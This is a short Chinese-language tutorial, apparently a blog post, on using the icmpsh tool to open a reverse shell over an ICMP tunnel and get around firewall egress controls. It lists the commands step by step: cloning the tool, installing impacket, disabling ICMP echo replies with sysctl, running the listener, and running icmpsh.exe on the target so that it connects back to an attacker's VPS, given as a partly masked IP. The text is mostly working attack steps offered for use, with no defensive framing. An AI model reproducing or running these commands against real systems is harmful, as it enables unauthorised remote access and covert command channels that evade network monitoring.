ICMP隧道利用（一）icmpsh工具反弹shell

    ICMP隧道简单，实用，在一般的通信协议里面，如果2台设备需要进行通信，肯定是需要开放端口的，但是在ICMP协议下就不需要了。内网中的大多数系统都位于防火墙和企业代理之后，以便控制入口以及出口流量。防火墙可以拦截到反连的shell，但ICMP协议基本上是不拦截的。因此，为了获得shell并在目标主机上执行命令，可以使用ICMP协议作为隐藏通道进行连接。使用icmpsh工具可用来执行此攻击就会显得格外香。

    步骤：

git clone https://github.com/inquisb/icmpsh

    安装Python的impacket类的库，方便对其他的协议进行访问，例如：IPv6，IPv4，SMB，Kerberos，WMI，LDAP等协议

apt-get install  python-impacket


    以下命令将禁止ICMP回显，这对于工具正常使用是至关重要的，启动一个监听器，该监听器将等待目标主机的ICMP数据包（因为icmpsh工具要替代本身的ping命令的应答程序，所以要关闭本地系统的ICMP应答，否则shell不稳定）

sysctl -wnet.ipv4.icmp_echo_ignore_all=1（设置为0是恢复应答）


    输入./run.sh，会提示输入目标的IP地址（目标主机的公网地址）

    然后再目标机器上执行自己准备的vps的地址

icmpsh.exe  -t  39.XXX.XXX.XXX -d 500 -b 30 -s 128


    然后关注vps界面，反弹shell到手，
